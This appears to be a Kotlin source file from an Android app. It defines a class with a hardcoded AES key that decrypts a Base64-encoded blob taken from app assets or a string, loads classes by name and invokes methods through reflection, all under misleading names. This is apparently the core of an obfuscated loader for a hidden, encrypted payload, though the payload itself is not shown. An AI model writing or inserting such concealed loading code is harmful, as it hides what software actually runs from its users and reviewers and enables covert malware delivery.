package com.whisper.gentle.zip

import com.whisper.gentle.toClass
import java.util.Base64
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.jvm.java
import kotlin.jvm.javaClass
import kotlin.runCatching
import kotlin.text.trimIndent
import kotlin.text.uppercase

/**
 * Date：2025/10/31
 * Describe:
 */
abstract class BaseInit {
    private val tag = "AES"
    val key = "345nuiizkjgasd12"


    protected fun getClass(claName: String): Class<*>? {
        runCatching {
            return claName.toClass()
        }
        return null
    }

    abstract fun fetNameAssets(): ByteArray

    fun appLov(k: ByteArray, s: String): ByteArray {
        val inputBytes = if (s == "aaa") {
            Base64.getDecoder().decode(fetNameAssets())
        } else {
            Base64.getDecoder().decode(s)
        }
        val key = SecretKeySpec(k, tag)
        val cipher = Cipher.getInstance(tag)
        cipher.init(Cipher.DECRYPT_MODE, key)
        val outputBytes = cipher.doFinal(inputBytes)
        return outputBytes
    }


    fun getLabel(): String {
        return this.key.uppercase()
    }

    override fun toString(): String {
        return this.getLabel()
    }

    protected fun fet(cA: Any, pair: Pair<String, String>): Any? {
        return cA.javaClass.getMethod(pair.first, String::class.java).invoke(cA, pair.second)
    }
}